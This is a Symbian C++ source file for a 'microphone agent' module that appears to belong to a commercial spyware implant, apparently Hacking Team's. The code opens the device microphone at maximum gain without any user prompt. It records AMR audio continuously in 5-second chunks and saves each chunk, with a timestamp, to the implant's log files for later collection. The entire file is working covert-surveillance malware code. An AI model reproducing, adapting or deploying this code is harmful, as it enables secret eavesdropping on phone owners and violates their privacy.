/*
 * AgentMic.cpp
 *
 *  Created on: 29/ago/2010
 *      Author: Giovanna
 */

/*
 * This code is based on:
 * S60 Platform: Audio Streaming Example v2.1 
 * http://www.forum.nokia.com/info/sw.nokia.com/id/4ed27119-e08e-480e-b0b8-aeb48fe5c5e8/S60_Platform_Audio_Streaming_Example_v2_1_en.zip.html
 * and explanations from:
 * SymbianOS C++ for Mobile Phones, vol. 2, Programming with Extended Functionality and Advanced Features, Richard Harrison (Wiley)
 */
#include "AgentMic.h"
#include <HT\LogFile.h>
#include <HT\TimeUtils.h>

//#include <speechencoderconfig.h>   // VAD activation/disactivation


// Audio data buffer size for AMR encoding (20 ms per frame, a total of 5000 ms in 250 frames).
// http://wiki.forum.nokia.com/index.php/AMR_format
const TInt KFrameSizeAMR = 32; 
const TInt KFrameCountAMR = 250;
const TInt KBufferSize = KFrameSizeAMR * KFrameCountAMR;
// Number of buffers used 
const TInt KStreamBufferCount = 2;

CAgentMic::CAgentMic() :
	CAbstractAgent(EAgent_Mic),iFramesCounter(0)
	{
	// No implementation required
	}

CAgentMic::~CAgentMic()
	{
	if(iInputStream)
	    {
	    iInputStream->Stop();
	    delete iInputStream;
	    }

	if(iRecData)
		{
		delete iRecData;
		}
	 
	iStreamBufferArray.ResetAndDestroy();            
	}

CAgentMic* CAgentMic::NewLC(const TDesC8& params)
	{
	CAgentMic* self = new (ELeave) CAgentMic();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentMic* CAgentMic::NewL(const TDesC8& params)
	{
	CAgentMic* self = CAgentMic::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentMic::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	
	TUint8* ptr = (TUint8 *)iParams.Ptr();
	TUint32 vad=0;               
	Mem::Copy( &vad, ptr, 4);
	if(vad == 1)
		iVadActive = ETrue;
	ptr += 4;
	Mem::Copy(&iVadThreshold,ptr,4 );
	
	// Initial audio stream properties for input and output, 8KHz mono. 
	// These settings could also be set/changed using method SetAudioPropertiesL() of
	// the input and output streams.
	iStreamSettings.iChannels=TMdaAudioDataSettings::EChannelsMono;
	iStreamSettings.iSampleRate=TMdaAudioDataSettings::ESampleRate8000Hz;
	// set default encoding
	iDefaultEncoding = KMMFFourCCCodeAMR; 
	// construct stream
	// priorities will be ignored if the capability MultimediaDD isn't provided
    iInputStream = CMdaAudioInputStream::NewL(*this,EPriorityLess,EMdaPriorityPreferenceNone);
    		
    // stream buffers allocation
    TDes8* buffer;
    for (TInt idx=0; idx<KStreamBufferCount; idx++)
    	{
			buffer = new(ELeave) TBuf8<KFrameSizeAMR>;
			CleanupStack::PushL(buffer);        
			//buffer->SetMax();
			//buffer->Zero();
     
			iStreamBufferArray.Append(buffer);        
			CleanupStack::Pop(buffer);        
    	}
	}

void CAgentMic::StartAgentCmdL()
	{
		
		TTime now;
		now.UniversalTime();
		//TInt64 filetime = GetFiletime(now);
		TInt64 filetime = TimeUtils::GetFiletime(now);
		iMicAdditionalData.highDateTime = (filetime >> 32);
		iMicAdditionalData.lowDateTime = (filetime & 0xFFFFFFFF);
		
		if(iRecData)
			{
		    delete iRecData;
		    iRecData = NULL;
		    }
		iRecData = HBufC8::NewL(KBufferSize);
		 
		if(iInputStream)
		    {
		        iInputStream->Stop();
		        delete iInputStream;
		        iInputStream = NULL;
		    }
		
		iFramesCounter = 0;
		
		// priorities will be ignored if the capability MultimediaDD isn't provided
		iInputStream = CMdaAudioInputStream::NewL(*this,EPriorityLess,EMdaPriorityPreferenceNone);
		        
		// Open input stream.
	    // Upon completion will receive callback in 
	    // MMdaAudioInputStreamCallback::MaiscOpenComplete().
	    iInputStream->Open(&iStreamSettings);
	    
	}

void CAgentMic::StopAgentCmdL()
	{
	if(iInputStream)
		{
		iInputStream->Stop();
		}
	}

/*
 * MMdaAudioInputStream callbacks (MMdaAudioInputStreamCallback)
 *
 * CAgentMic::MaiscOpenComplete(
 *     TInt aError)
 *
 * called upon completion of CMdaAudioInputStream::Open(),
 *  if the stream was opened succesfully (aError==KErrNone), it's ready for use.
 *  upon succesful open, the first audio data block will be read from the input
 *  stream.
 */
void CAgentMic::MaiscOpenComplete(TInt aError)
    {
	if (aError==KErrNone) 
        {
		// Set the data type (encoding)
        TRAPD(error, iInputStream->SetDataTypeL(iDefaultEncoding));

        // set stream input gain to maximum
        iInputStream->SetGain(iInputStream->MaxGain());
        
        
        // two buffers are used, they will be used in a internal FIFO queue
        iInputStream->ReadL(*iStreamBufferArray[0]);
        iInputStream->ReadL(*iStreamBufferArray[1]);
        } 
    }

/*
 * CAgentMic::MaiscBufferCopied(
 *      TInt aError, const TDesC8& aBuffer)
 *      
 *      called when a block of audio data has been read and is available at the 
 *      buffer reference *aBuffer.  calls to ReadL() will be issued until all blocks
 *      in the audio data buffer (iStreamBuffer) are filled.
 */
void CAgentMic::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
    {
	if (aError==KErrNone && iInputStream) 
	    {
		if (&aBuffer==iStreamBufferArray[0])
		        iInputStream->ReadL(*iStreamBufferArray[0]);
		    else
		    	iInputStream->ReadL(*iStreamBufferArray[1]);
		if(aBuffer.Length())
			{
			iRecData->Des().Append(aBuffer);
			iFramesCounter++;
			if(iFramesCounter == KFrameCountAMR)
				{
				// 5 sec has been recorded, save log...
				CLogFile* logFile = CLogFile::NewLC(iFs);
				logFile->CreateLogL(LOGTYPE_MIC, &iMicAdditionalData);
				logFile->AppendLogL(*iRecData);
				logFile->CloseLogL();
				CleanupStack::PopAndDestroy(logFile);
				// ...reset buffer and counter
				iRecData->Des().Zero();
				iFramesCounter = 0;
				}
		    }
		}
	else if(aError == KErrAbort)
		{
		// a Stop has been issued and this is the remaining audio data
		if(aBuffer.Length())
			{
			iRecData->Des().Append(aBuffer);
			CLogFile* logFile = CLogFile::NewLC(iFs);
			logFile->CreateLogL(LOGTYPE_MIC, &iMicAdditionalData);
			logFile->AppendLogL(*iRecData);
			logFile->CloseLogL();
			CleanupStack::PopAndDestroy(logFile);
			iRecData->Des().Zero();
			iFramesCounter = 0;
			}
		}
    }


/*
 * 
 * CAgentMic::MaiscRecordComplete(
 *      TInt aError)
 *      
 *      called when input stream is closed by CMdaAudioInputStream::Stop()
 *      
 */
void CAgentMic::MaiscRecordComplete(TInt aError)
    {   
	if (aError == KErrNone) 
        {
        // normal stream closure after a stop and maiscbuffercopied
		}
    else if(aError == KErrUnderflow)
    	{
		// we have finished all the buffers
		}
    else if(aError == KErrCancel || aError == KErrAbort)
    	{
		// user selected stop
		}
    else 
        {
        // completed with error(s)
		} 
    }

/*
TInt64 CAgentMic::GetFiletime(TTime aCurrentUtcTime){
	
	_LIT(KInitialTime,"16010000:000000");
	TTime initialTime;
	initialTime.Set(KInitialTime);
		
	TTimeIntervalMicroSeconds interval;
	interval=aCurrentUtcTime.MicroSecondsFrom(initialTime);
		
	return interval.Int64()*10; 
		
}
*/
